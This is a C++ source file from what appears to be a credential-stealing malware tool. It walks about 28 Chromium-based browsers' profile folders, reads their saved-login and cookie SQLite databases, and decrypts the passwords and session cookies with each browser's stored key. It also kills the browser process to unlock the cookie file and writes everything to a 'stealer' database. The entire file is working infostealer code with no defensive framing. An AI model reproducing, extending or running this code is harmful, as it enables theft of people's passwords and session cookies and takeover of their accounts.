#include "includes\ChromiumParser.h"

std::string chromium_paths = "AppData\\Local\\";
std::vector<std::string> browsers_chromium = {
	"Microsoft\\Edge\\",
	"Google\\Chrome\\",
	"Opera Software\\Opera Stable", //Diff, in Roaming
	"Iridium\\",
	"Chromium\\",
	"BraveSoftware\\Brave-Browser\\",
	"CentBrowser\\",
	"Chedot\\",
	"Orbitum\\",
	"Comodo\\Dragon\\",
	"Yandex\\YandexBrowser\\",
	"7Star\\7Star\\",
	"Torch\\",
	"MapleStudio\\ChromePlus\\",
	"Kometo\\",
	"Amigo\\",
	"Sputnik\\Sputnik\\",
	"CatalinaGroup\\Citrio\\",
	"360Chrome\\Chrome\\",
	"uCozMedia\\Uran\\",
	"liebao\\",
	"Elements Browser\\",
	"Epic Privacy Browser\\",
	"CocCoc\\Browser\\",
	"Fenrir Inc\\Sleipnir5\\setting\\modules\\ChromiumViewer",
	"QIP Surf\\",
	"Coowon\\Coowon\\",
	"Vivaldi\\"
};

BOOL chromium_parser(std::string username, std::string stealer_db)
{
	std::vector<DataHolder> data_list;

	std::string target_user_data;
	std::string target_login_data;
	std::string target_key_data;

	// Those paths that contains '\\' at the end means they have the default file 'User Data'
	// Those paths that doesn't contain '\\' at the end means they are the data directories themselves
	for (const auto& dir : browsers_chromium) {

		if (dir.back() == '\\')
			target_user_data = "C:\\users\\" + username + "\\" + chromium_paths + dir + "User Data";
		else
		{
			// in case of opera, the login data is in roaming instead of local
			if(dir.find("Opera") != std::string::npos)
				target_user_data = "C:\\users\\" + username + "\\" + "AppData\\Roaming\\" + dir;
			else
				target_user_data = "C:\\users\\" + username + "\\" + chromium_paths + dir;
		}

		target_login_data = target_user_data + "\\Default\\Login Data";
		target_key_data = target_user_data + "\\Local State";

		try {
			sqlite3_stmt* stmt = query_database(target_login_data, "SELECT origin_url, username_value, password_value FROM logins");
			
			if (stmt == nullptr)
				continue;

			//Decrypt Key
			ChromiumDecryptor obj;
			if (obj.ChromiumDecryptorInit(target_key_data))
			{
				while (sqlite3_step(stmt) == SQLITE_ROW)
				{
					DataHolder data;

					char* url = (char*)sqlite3_column_text(stmt, 0);
					char* username = (char*)sqlite3_column_text(stmt, 1);
					//char* password = (char*)sqlite3_column_text(stmt, 2);					

					std::vector<BYTE> password;
					const void* password_blob = sqlite3_column_blob(stmt, 2);
					int password_blob_size = sqlite3_column_bytes(stmt, 2);

					if (url != nullptr && username != nullptr && password_blob != nullptr && password_blob_size > 0) {
						// Assign the BLOB data to the std::vector<BYTE>
						password.assign((const BYTE*)password_blob, (const BYTE*)password_blob + password_blob_size);

						if ((strlen(url) == 0) || (strlen(username) == 0) || password.empty())
							continue;

						data.setUrl(url);
						data.setUsername(username);
						data.setHost(dir);

						try
						{
							//decrypt password here
							std::string decrypted_password = obj.AESDecrypter(password);
							data.setPassword(decrypted_password);
						}
						catch(int e)
						{
							continue;
						}

						data_list.push_back(data);
					}
					else {
						// Handle the case where the password_blob is null (no data)
						continue;
					}
				}
			}
			else
			{
				continue;
			}
		}
		catch (int e)
		{
			continue;
		}		
	}

	if (!dump_password_data(stealer_db, data_list, data_list.size()))
		return false;

	return true;
}

BOOL chromium_cookie_collector(std::string username, std::string stealer_db)
{
	std::vector<DataHolder> data_list;

	std::string target_user_data;
	std::string target_cookie_data;
	std::string target_key_data;

	// Those paths that contains \\ at the end means they have the default file 'User Data'
	// Those paths that doesn't contain \\ at the end means they are the data directories themselves
	for (const auto& dir : browsers_chromium) {

		if (dir.back() == '\\')
			target_user_data = "C:\\users\\" + username + "\\" + chromium_paths + dir + "User Data";
		else
		{
			// in case of opera, the login data is in roaming instead of local
			if (dir.find("Opera") != std::string::npos)
				target_user_data = "C:\\users\\" + username + "\\" + "AppData\\Roaming\\" + dir;
			else
				target_user_data = "C:\\users\\" + username + "\\" + chromium_paths + dir;
		}

		target_cookie_data = target_user_data + "\\Default\\Network\\Cookies";
		target_key_data = target_user_data + "\\Local State";

		try {
			sqlite3_stmt* stmt = query_database(target_cookie_data, "SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies");

			if (stmt == nullptr)
			{
				// cookies file is locked when chromium based browser is running
				if (!kill_process(dir))
					continue;

				stmt = query_database(target_cookie_data, "SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies");
				
				if (stmt == nullptr)
				{
					continue;
				}
			}

			//Decrypt key
			ChromiumDecryptor obj;
			if (obj.ChromiumDecryptorInit(target_key_data))
			{
				while (sqlite3_step(stmt) == SQLITE_ROW)
				{
					DataHolder data;

					char* host_key = (char*)sqlite3_column_text(stmt, 0);
					char* name = (char*)sqlite3_column_text(stmt, 1);

					std::vector<BYTE> cookies;
					const void* encrypted_value = sqlite3_column_blob(stmt, 3);
					int encrypted_value_size = sqlite3_column_bytes(stmt, 3);
					char* expiry = (char*)sqlite3_column_text(stmt, 4);

					if (host_key != nullptr && name != nullptr && encrypted_value != nullptr && encrypted_value_size > 0) {
						// Assign the BLOB data to the std::vector<BYTE>
						cookies.assign((const BYTE*)encrypted_value, (const BYTE*)encrypted_value + encrypted_value_size);

						if ((strlen(host_key) == 0) || (strlen(name) == 0) || cookies.empty())
							continue;


						data.setUrl(host_key);
						data.setCookieName(name);
						data.setHost(dir);
						data.setCookieExpiry(expiry);

						try
						{
							//decrypt cookies here
							std::string decrypted_cookies = obj.AESDecrypter(cookies);
							data.setCookies(decrypted_cookies);
						}
						catch (int e)
						{
							continue;
						}

						data_list.push_back(data);
					}
					else {
						// Handle the case where the cookies_blob is null (no data)
						continue;
					}
				}
			}
			else
			{
				continue;
			}
		}
		catch (int e)
		{
			continue;
		}
	}

	if (!dump_cookie_data(stealer_db, data_list, data_list.size()))
		return false;

	return true;
}
